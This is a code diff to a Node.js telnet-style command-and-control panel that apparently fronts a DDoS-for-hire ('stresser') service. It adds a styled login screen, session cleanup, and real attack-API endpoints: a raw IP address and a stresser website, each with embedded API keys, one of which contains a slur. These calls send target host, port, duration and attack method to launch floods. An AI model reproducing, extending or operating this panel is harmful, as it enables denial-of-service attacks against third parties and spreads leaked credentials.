@@ -20,11 +20,13 @@ const sleep = (milliseconds) => {
 
 server.listen(port, function() {
     console.log("Server started! => "  + port);
+    reset_sessions();
 });
 
 server.on('connection', function(socket) {
     //set_title("Welcome To Scrapy's CNC!", socket);
-    socket.write(banners.main() + config.hostname())
+    socket.write(config.Colors.Clear);
+    socket.write(banners.main() + config.Colors.Purple + "                            Traumatized Login Screen\r\n" + config.Colors.Black);
     console.log("A new connection has been established");
     var socket_port = socket.remotePort;
     var socket_ip = socket.remoteAddress.replace("::ffff:", "");
@@ -97,13 +99,13 @@ server.on('connection', function(socket) {
                 let port = config.CurrentCMD.arg[2]
                 let time = config.CurrentCMD.arg[3]
                 let method = config.CurrentCMD.arg[4]
-                f('https://api.com/api.php?key=key&host=' +ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+                f('http://50.115.166.121/api.php?key=skidfag3&host=' +ip + "&port=" + port + "&time=" + time + "&type=" + method).then(res => res.text()).then(body => {
                     console.log(body);
                     if(body.toLowerCase().includes("attack sent")) {
                         socket.write("Attack Sent To " + ip + ":" + port + " for " + time + " seconds with " + method);
                     }
                 })
-                f('https://api.com/api.php?key=key&host=' +ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+                f('https://plutoniumstress.com/api/api.php?key=UlzXDMT60CmBP3p8&vip=0&host=' +ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
                     console.log(body);
                 })
             } else if(cleanSTR.startsWith("exit")) {
@@ -121,17 +123,18 @@ server.on('connection', function(socket) {
             let pw = config.CurrentCMD.arg[1];
             let login_response = auth.login(username, pw, socket_ip);
             if(login_response.includes("Successfully")) {
-                socket.write(login_response + "\r\n" + config.hostname(config.CurrentUser.Username));
+                socket.write(config.Colors.Clear + banners.main() + config.Colors.Purple + "                  [+] " + login_response + "\r\n" + config.hostname(config.CurrentUser.Username));
             } else {
-                socket.write(login_response + "\r\n" + config.hostname(""));
+                socket.write(config.Colors.Purple + "[x] " + login_response + "\r\n" + config.hostname(""));
             }
         } else {
-            socket.write("Must login\r\nUsage: <username> <password>\r\n")
+            socket.write(config.Colors.Clear + config.Colors.Purple + "          Must login\r\nUsage: <username> <password>\r\n" + config.Colors.Black)
         }
     });
 
     // WHEN A CLIENT DISCONNECTS
     socket.on('end', function() {
+        crud.remove_session(socket_ip);
         console.log('Closing connection with the client\r\n');
     });
 
@@ -142,7 +145,5 @@ server.on('connection', function(socket) {
 });
 
 function reset_sessions() {
-    exec("rm -rf db/current.db; touch db/current.db; chmod 777 db/current.db", function(error, stdin, stderr) {
-        console.log(stdin)
-    })
+    fs.writeFileSync(crud.current_path, "");
 }
